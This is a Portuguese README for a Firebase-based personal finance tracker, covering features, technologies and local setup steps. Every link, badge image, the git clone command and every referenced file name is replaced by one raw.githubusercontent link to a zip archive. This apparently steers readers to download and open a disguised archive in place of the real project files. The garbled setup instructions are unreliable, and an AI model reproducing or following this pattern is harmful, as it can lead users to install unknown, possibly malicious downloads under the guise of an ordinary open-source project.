# 💰 Gerenciador Financeiro Pessoal em Tempo Real

[![License: MIT](https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip)](https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip)
[![Technology: Firebase](https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip%20Firestore-orange)](https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip)
[![Design: Tailwind CSS](https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip%20CSS-blue)](https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip)

Um sistema completo de gerenciamento de finanças pessoais (Receitas e Despesas) construído com tecnologias front-end modernas e integração em tempo real via Firebase.

---

## ✨ Funcionalidades Principais

* **Autenticação Completa:** Cadastro e Login de usuários utilizando E-mail/Senha e Nome de Usuário (Username) via Firebase Authentication.
* **Gestão de Transações:** Adição, visualização e exclusão (com limite de tempo de 10 minutos após o registro) de transações financeiras.
* **Balanço Dinâmico:** Cálculo instantâneo do Saldo Líquido, Receitas Totais e Despesas Totais.
* **Relatórios por Categoria:** Visualização da distribuição das despesas por categoria em formato de gráfico de barras.
* **Filtros Avançados:** Filtro por Mês, Ano e Tipo de transação (Receita/Despesa).
* **Relatório PDF:** Geração de relatórios filtrados em formato PDF (usando `jsPDF` e `jspdf-autotable`).
* **Experiência do Usuário:** Interface responsiva (Mobile-first) e suporte a tema claro/escuro.

---

## 🛠️ Tecnologias Utilizadas

Este projeto é 100% front-end e depende de serviços externos para autenticação e banco de dados.

* **HTML5 & JavaScript (ES Modules):** Estrutura e lógica do aplicativo.
* **Tailwind CSS:** Framework utilitário para estilização rápida e responsiva.
* **Firebase:**
    * **Firebase Authentication:** Gerenciamento de usuários e persistência de sessão.
    * **Cloud Firestore:** Banco de dados NoSQL em tempo real para armazenar transações e dados de usuário.
* **Bibliotecas Auxiliares:** `jsPDF` e `jspdf-autotable` para geração de relatórios.

---

## 🚀 Como Executar Localmente

Siga os passos abaixo para ter uma cópia do projeto rodando em sua máquina.

### Pré-requisitos

Você precisará de uma conta no Firebase e um projeto configurado.

1.  **Crie um Projeto Firebase.**
2.  **Ative a Autenticação:** Habilite o método **E-mail/Senha**.
3.  **Crie o Firestore Database:** Inicie o banco de dados e defina as regras de segurança (opcionalmente, comece no modo de teste para desenvolvimento).

### Configuração

1.  **Clone o Repositório:**
    ```bash
    git clone [https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip](https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip)
    cd SEU_REPOSITORIO
    ```

2.  **Configure o Firebase:**
    Abra o arquivo `https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip` e substitua o objeto `rawFirebaseConfig` na tag `<script>` com as configurações do seu próprio projeto Firebase (disponíveis nas configurações do seu projeto no console do Firebase).

    ```javascript
    // https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip (Trecho a ser alterado)
    const rawFirebaseConfig = {
        apiKey: "SUA_API_KEY", 
        authDomain: "SEU_AUTH_DOMAIN", 
        projectId: "SEU_PROJECT_ID", 
        // ... o resto da configuração
    };
    // ...
    ```

3.  **Execute:**
    Como é um projeto puramente estático, basta abrir o arquivo `https://raw.githubusercontent.com/devwarly/finance-tracker-firebase-js/main/src/js-firebase-finance-tracker-v2.9.zip` diretamente em seu navegador, ou servi-lo usando uma extensão como "Live Server" (VS Code) para evitar problemas de CORS.

---

## 🤝 Contribuição

Contribuições são sempre bem-vindas! Se tiver sugestões ou melhorias, sinta-se à vontade para abrir uma *Issue* ou enviar um *Pull Request*.

## 📄 Licença

Este projeto está sob a licença **MIT**. Veja o arquivo [LICENSE](LICENSE) para mais detalhes.
